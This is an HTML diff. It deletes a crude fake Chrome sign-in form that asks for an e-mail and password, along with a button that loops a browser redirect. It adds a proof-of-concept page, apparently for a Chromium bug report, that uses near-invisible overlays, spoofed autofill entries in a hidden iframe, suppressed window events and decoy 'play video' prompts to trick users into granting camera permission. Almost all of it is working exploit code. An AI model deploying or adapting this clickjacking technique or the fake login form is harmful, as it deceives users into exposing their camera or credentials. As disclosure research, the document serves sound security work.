@@ -1,11 +1,159 @@
 
-	<script>
-		function start(){
-	          setInterval(`x=document.location='googlechrome://about:about';`, 600);
-		}
-	</script>
-Already a Chrome user? Sign in
-<li>Your e-mail <input type="search"></li>
-<li> Your password <input type="password"></li>
-<li> Step-2 <input type="button" value="go to Google.com" onclick="start()" ></li>
-<li> Step-2 <input type="button" value="fuck you asshole" onclick="document.location='http://www.google.com'" ></li>
+<!doctype html>
+<html>
+<head>
+<style>
+html { font-family: sans-serif; }
+body { overflow: hidden; }
+iframe.formFrame { width: 1px; height: 1px; opacity: 0.01; }
+#overlayElem { position: absolute; opacity: 0.001; cursor: default; width: 100%; height: calc(100vh - 10px); top: 0px; left: 0; z-index: 5; }
+
+body.hasBar #overlayElem.move { left: 350px; top: 90px; height: calc(100vh - 130px); }
+body.noBar #overlayElem.move { left: 110px; top: 60px; height: calc(100vh - 100px); }
+
+#instructions { text-align: center; margin-top: 200px; font-size: 2em; }
+#instructions.hide { display: none; }
+</style>
+</head>
+<body>
+<h1>PoC: Autofill over browser UI, permission prompt</h1>
+<p>This requires two clicks in quick succession (to reduce chances of user noticing original text/UI)</p>
+<p>Try this PoC with and without bookmarks bar to see different spoofs</p>
+<p>Also uses secondary techniques described in crbug.com/1172533</p>
+<p id="output"></p>
+
+<p id="instructions">Please double-click to play video</p>
+
+<input type="text" id="overlayElem" name="alesandroortiz[uniqueInit2]" autofocus autocomplete="off">
+
+<script>
+const trustedOrigin = 'https://alesandroortiz.com';
+
+var hasBookmarksBar = true;
+var barStatusString = 'hasBar';
+
+var checkBookmarksBar = () => {
+  // On my machine diff is 118px w/ bar, 86px w/out bar
+  if (window.outerHeight - window.innerHeight >= 100) {
+    // Probably has bar
+    barStatusString = 'hasBar';
+    document.body.classList.add(barStatusString);
+    hasBookmarksBar = true;
+    instructions.innerText = "Please double-click to verify you're a human";
+  } else {
+    // Probably no bar
+    barStatusString = 'noBar';
+    document.body.classList.add(barStatusString);
+    hasBookmarksBar = false;
+    instructions.innerText = "Please double-click to play video";
+  }
+}
+
+checkBookmarksBar();
+
+var createAutofillEntryViaFrame = (entry) => {
+  var frameElem = document.createElement('iframe');
+  frameElem.classList.add('formFrame');
+  frameElem.addEventListener('load', (event) => {
+    if (event.target.contentWindow.location.search.indexOf('submitted') > -1) {
+      // After form submit, remove frame
+      event.target.remove();
+      return;
+    }
+    event.target.contentWindow.postMessage({"entry": entry, "fieldSuffix": '2'+barStatusString}, trustedOrigin);
+  });
+  document.body.appendChild(frameElem); 
+  frameElem.src = 'autofill-setup-frame.html';
+}
+
+if (hasBookmarksBar) {
+  // Arrows: U+1F868 or U+1F878
+  createAutofillEntryViaFrame('\uD83E\uDC68  Click "Allow" To Continue');
+} else {
+  // createAutofillEntryViaFrame('Allow website to play this video?');
+  createAutofillEntryViaFrame(window.location.hostname+' wants to play a video');
+}
+
+var disableMostEventsForWindow = () => {
+  // Same technique as PoC from crbug.com/1172533
+  // Disables all events except keydown event
+  // Note: This must be run on window, NOT the input elem
+  for (elemProperty in window) {
+    if (elemProperty.indexOf('on') == 0) {
+       if (elemProperty === 'onmousedown') {
+          // Do nothing
+       } else if (elemProperty === 'onbeforeunload') {
+          // onbeforeunload empty to allow PoC reset without additional browser prompt
+       } else {
+         window[elemProperty] = (event) => {
+           overlayElem.focus();
+           overlayElem.click();
+           return false;
+         }
+       }
+    }
+  }
+}
+
+var isFirstClick = true;
+overlayElem.addEventListener('mousedown', (event) => {
+  if (isFirstClick) {
+    isFirstClick = false;
+    navigator.mediaDevices.getUserMedia({video: true})
+    .catch((e) => {
+      isFirstClick = true; // We cannot proceed, so reset state
+      if (e.message.indexOf('Permission denied') > -1) {
+        instructions.innerText = 'Please reset content settings to Ask';
+      } else {
+        console.error(e);
+        window.location.reload();
+      }
+    });
+    overlayElem.classList.add('move');
+    return;
+  }
+
+  // Delay changing to button until autofill prompt is shown
+  setTimeout(() => { overlayElem.type = 'button'; }, 100);
+
+  // Change input field name and enable autocompletion.
+  // Values are different initially to prevent spurious keyboard input from creating or showing unwanted autofill entries.
+  overlayElem.value = '';
+  overlayElem.name = 'alesandroortiz[unique2'+barStatusString+']';
+  overlayElem.autocomplete = 'on';
+
+  instructions.classList.add('hide');
+
+  disableMostEventsForWindow();
+});
+
+/*
+overlayElem.addEventListener('blur', (event) => {
+  // Blur will close autofill prompt, so reset if blur not due to user allowing permission
+  // Disabled since we need a bit more work to detect blur due to click over permission prompt vs. other browser UI
+  if (overlayElem.autocomplete == 'on') {
+    window.location.reload();
+  }
+});
+*/
+
+setInterval(() => {
+  // If user clicks autofill value, reset
+  // Cannot use 'change' event since it's not fired for input[type=button] elements
+  if (overlayElem.value.length > 0) {
+    window.location.reload();
+  }
+}, 100);
+
+var reloadDebounceTimer;
+window.addEventListener('resize', (event) => {
+  clearTimeout(reloadDebounceTimer);
+  reloadDebounceTimer = setTimeout(() => {
+    window.location.reload();
+  }, 300);
+});
+
+</script>
+
+</body>
+</html>
